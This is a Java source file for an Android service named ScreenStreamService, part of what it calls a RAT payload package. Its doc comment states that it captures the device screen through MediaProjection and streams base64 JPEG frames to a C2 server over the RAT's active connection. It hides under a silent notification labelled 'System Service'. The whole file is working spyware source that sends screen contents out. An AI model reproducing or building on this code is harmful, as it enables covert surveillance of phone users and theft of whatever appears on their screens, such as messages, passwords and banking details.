package com.egnakerat.system.Payloads;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.egnakerat.system.ConnectionManager;
import com.egnakerat.system.R;
import com.egnakerat.system.RATService;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * ScreenStreamService v1.0
 * 
 * Captures device screen using MediaProjection API and streams
 * JPEG frames to C2 server via Socket connection.
 * 
 * Resolution: 720p (1280x720)
 * FPS: 5 frames per second
 * Quality: 60% JPEG
 */
public class ScreenStreamService extends Service {

    private static final String TAG = "ScreenStream";
    private static final String CHANNEL_ID = "screen_stream_channel";
    private static final int NOTIFICATION_ID = 9876;

    // Stream configuration
    private static final int STREAM_WIDTH = 1280;
    private static final int STREAM_HEIGHT = 720;
    private static final int JPEG_QUALITY = 60;
    private static final int DEFAULT_FPS = 5;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private volatile boolean streaming = false;
    private int fps = DEFAULT_FPS;
    private int screenDensity;

    // Static reference for MediaProjection result
    private static int resultCode = -1;
    private static Intent resultData = null;
    private static boolean pendingStart = false;

    /**
     * Set the MediaProjection permission result from Activity.
     */
    public static void setMediaProjectionResult(int code, Intent data) {
        resultCode = code;
        resultData = data;
    }

    public static void requestStart() {
        pendingStart = true;
    }

    public static boolean isPendingStart() {
        return pendingStart;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        // Get screen density
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        screenDensity = metrics.densityDpi;

        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        String instruction = intent.getStringExtra("ins");
        if (instruction == null) return START_NOT_STICKY;

        // Start as foreground
        Notification notification = buildNotification();
        startForeground(NOTIFICATION_ID, notification);

        switch (instruction) {
            case "startStream":
                int reqFps = intent.getIntExtra("fps", DEFAULT_FPS);
                startStreaming(reqFps);
                break;
            case "stopStream":
                stopStreaming();
                stopSelf();
                break;
        }

        return START_NOT_STICKY;
    }

    private void startStreaming(int requestedFps) {
        if (streaming) {
            Log.w(TAG, "Already streaming");
            return;
        }

        if (resultCode == -1 || resultData == null) {
            Log.e(TAG, "No MediaProjection permission available");
            // Send error response
            ConnectionManager conn = RATService.activeConnection;
            if (conn != null) {
                try {
                    org.json.JSONObject data = new org.json.JSONObject();
                    data.put("error", "MediaProjection permission not granted. User must approve screen capture.");
                    conn.sendResponse("screen_stream", "error", data);
                } catch (Exception ignored) {}
            }
            return;
        }

        this.fps = Math.max(1, Math.min(requestedFps, 15)); // Clamp 1-15 FPS

        try {
            // Create MediaProjection
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to create MediaProjection");
                return;
            }

            // Setup background thread
            backgroundThread = new HandlerThread("ScreenStreamThread");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());

            // Setup ImageReader
            imageReader = ImageReader.newInstance(STREAM_WIDTH, STREAM_HEIGHT,
                    PixelFormat.RGBA_8888, 2);

            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenStream",
                    STREAM_WIDTH, STREAM_HEIGHT, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null, backgroundHandler);

            streaming = true;
            pendingStart = false;

            // Start frame capture loop
            backgroundHandler.post(this::captureLoop);

            Log.d(TAG, "Screen streaming started at " + fps + " FPS, " +
                    STREAM_WIDTH + "x" + STREAM_HEIGHT + " @ " + JPEG_QUALITY + "% quality");

        } catch (Exception e) {
            Log.e(TAG, "Start streaming error: " + e.getMessage());
            stopStreaming();
        }
    }

    private void captureLoop() {
        if (!streaming) return;

        try {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                // Convert Image to JPEG Base64
                String frameBase64 = imageToBase64Jpeg(image);
                image.close();

                if (frameBase64 != null) {
                    ConnectionManager conn = RATService.activeConnection;
                    if (conn != null && conn.isConnected()) {
                        conn.sendScreenFrame(frameBase64);
                    } else {
                        // Connection lost, stop streaming
                        stopStreaming();
                        return;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Frame capture error: " + e.getMessage());
        }

        // Schedule next frame
        if (streaming && backgroundHandler != null) {
            backgroundHandler.postDelayed(this::captureLoop, 1000 / fps);
        }
    }

    private String imageToBase64Jpeg(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes.length == 0) return null;

            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * STREAM_WIDTH;

            // Create bitmap
            Bitmap bitmap = Bitmap.createBitmap(
                    STREAM_WIDTH + rowPadding / pixelStride,
                    STREAM_HEIGHT,
                    Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            // Crop to exact size (remove padding)
            if (bitmap.getWidth() > STREAM_WIDTH) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, STREAM_WIDTH, STREAM_HEIGHT);
                bitmap.recycle();
                bitmap = cropped;
            }

            // Compress to JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
            bitmap.recycle();

            byte[] jpegBytes = baos.toByteArray();
            return Base64.encodeToString(jpegBytes, Base64.NO_WRAP);

        } catch (Exception e) {
            Log.e(TAG, "Image conversion error: " + e.getMessage());
            return null;
        }
    }

    private void stopStreaming() {
        streaming = false;

        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            backgroundThread = null;
            backgroundHandler = null;
        }

        Log.d(TAG, "Screen streaming stopped");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Screen Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Active")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }

    @Override
    public void onDestroy() {
        stopStreaming();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
